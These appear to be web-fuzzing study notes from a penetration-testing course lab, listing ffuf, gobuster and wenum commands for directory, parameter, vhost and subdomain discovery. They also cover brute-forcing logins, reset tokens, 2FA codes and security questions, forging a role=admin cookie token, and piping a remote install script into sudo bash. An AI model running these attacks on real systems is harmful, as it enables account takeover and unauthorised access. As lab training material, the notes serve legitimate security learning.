# Web Fuzzing

### 

```shell
go install github.com/ffuf/ffuf/v2@latest
go install github.com/OJ/gobuster/v3@latest

curl -sL https://raw.githubusercontent.com/epi052/feroxbuster/main/install-nix.sh | sudo bash -s $HOME/.local/bin

pipx install git+https://github.com/WebFuzzForge/wenum
pipx runpip wenum install setuptools
```


```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://IP:PORT/FUZZ

ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://IP:PORT/w2ksvrus/FUZZ -e .php,.html,.txt,.bak,.js -v
```

### Recursive Fuzzing

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -ic -v -u http://IP:PORT/FUZZ -e .html -recursion
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -ic -u http://IP:PORT/FUZZ -e .html -recursion -recursion-depth 2 -rate 500
ffuf -u http://154.57.164.76:31064/recursive_fuzz/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -recursion -e .php,.txt,.html -ic -t 80
```

### Parameter Fuzzing

```bash
wenum -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 -u "http://IP:PORT/get.php?x=FUZZ"
ffuf -u http://IP:PORT/post.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "y=FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200 -v
```

### Virtual Host and Subdomain Fuzzing

```bash
gobuster vhost -u http://inlanefreight.htb:81 -w /usr/share/seclists/Discovery/Web-Content/common.txt --append-domain

gobuster dns -d inlanefreight.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

### Filtering fuzzing output

```bash
gobuster: -s, -b, --exclude-length
fuzz: -mc, -fc, -fs, -mc, -fw, -mw, -fl, -ml, -mt
wenum: --sc, --hc, --hl, --sl, --hw, --sw, --hs, --ss, --hr, --sr, --filter/--hard-filter
feroxbuster: -s, -S, -X
```

### Web APIs

```bash
git clone https://github.com/PandaSt0rm/webfuzz_api.git
cd webfuzz_api
pip3 install -r requirements.txt

python3 api_fuzzer.py http://IP:PORT


```

### Brute-forcing

```shell
ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt -u http://94.237.54.176:58188/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=123" -fr "Unknown user."

ffuf -w ./custom_wordlist.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"

wc -l /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
grep '[[:upper:]]' /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt
awk 'length($0) >= 10 && /[a-z]/ && /[A-Z]/ && /[0-9]/' /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt > custom_wordlist.txt
ffuf -w ./custom_wordlist.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"

seq -w 0 9999 > tokens.txt
ffuf -w ./tokens.txt -u http://weak_reset.htb/reset_password.php?token=FUZZ -fr "The provided token is invalid"
```

```bash
seq -w 0 9999 > tokens.txt
ffuf -w ./tokens.txt -u http://bf_2fa.htb/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93" -d "otp=FUZZ" -fr "Invalid 2FA Code"
```

```bash
cat world-cities.csv | cut -d ',' -f1 > city_wordlist.txt
ffuf -w ./city_wordlist.txt -u http://pwreset.htb/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=39b54j201u3rhu4tab1pvdb4pv" -d "security_response=FUZZ" -fr "Incorrect response."

cat world-cities.csv | grep Germany | cut -d ',' -f1 > german_cities.txt

// rewrite the response to 200 OK

ffuf -w user_ids.txt -u http://154.57.164.67:32662/admin.php?user_id=FUZZ -fr "Could not load admin data."
```

```bash
// Predictable tokens

echo -n dXNlcj1odGItc3RkbnQ7cm9sZT11c2Vy | base64 -d

user=htb-stdnt;role=user

echo -n '757365723d6874622d7374646e743b726f6c653d75736572' | xxd -r -p
echo -n 'user=htb-stdnt;role=admin' | xxd -p
```
